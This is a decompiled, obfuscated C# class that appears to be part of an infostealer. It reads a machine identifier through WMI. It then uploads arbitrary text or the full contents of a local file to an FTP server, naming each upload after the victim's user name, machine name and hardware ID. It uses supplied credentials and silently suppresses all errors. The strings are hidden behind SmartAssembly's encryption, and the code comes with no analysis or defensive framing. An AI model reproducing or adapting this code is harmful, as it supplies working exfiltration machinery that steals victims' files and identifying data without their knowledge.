using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace azCTgkmpGT;

internal sealed class hIHAEKpEeiS
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string TMqqKWTFyQVhVGLF()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107380477));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107380488)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107380439);
			ManagementObject val3 = new ManagementObject(getString_0(107380434) + text2 + getString_0(107380937));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107380932)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107401669) : text;
		}
	}

	public static void FMySfiPDvIaBq(string NUsIyAjkUjn = "URL", string vyqyGisikoWwvL = "USERNAME", string AtCClTftwwdszSG = "ACCESO", string zoMJbHxIJoDK = "")
	{
		try
		{
			string text = TMqqKWTFyQVhVGLF();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(NUsIyAjkUjn + getString_0(107349280) + Environment.UserName + getString_0(107349267) + Environment.MachineName + getString_0(107349246) + text + getString_0(107349241));
			ftpWebRequest.Method = getString_0(107380907);
			ftpWebRequest.Credentials = new NetworkCredential(vyqyGisikoWwvL, AtCClTftwwdszSG);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(zoMJbHxIJoDK);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void SRnkQsJyJfqDTNo(string VzhfdpzaLofIX = "URL", string bwUIMHNTMBkC = "USERNAME", string MhbxvcDFuE = "ACCESO", string aPIVmOuUBFWG = "")
	{
		try
		{
			string text = TMqqKWTFyQVhVGLF();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(VzhfdpzaLofIX + getString_0(107349280) + Environment.UserName + getString_0(107349267) + Environment.MachineName + getString_0(107349246) + text + getString_0(107349246) + Path.GetFileName(aPIVmOuUBFWG));
			ftpWebRequest.Method = getString_0(107380907);
			ftpWebRequest.Credentials = new NetworkCredential(bwUIMHNTMBkC, MhbxvcDFuE);
			byte[] array = File.ReadAllBytes(aPIVmOuUBFWG);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static hIHAEKpEeiS()
	{
		Strings.CreateGetStringDelegate(typeof(hIHAEKpEeiS));
	}
}
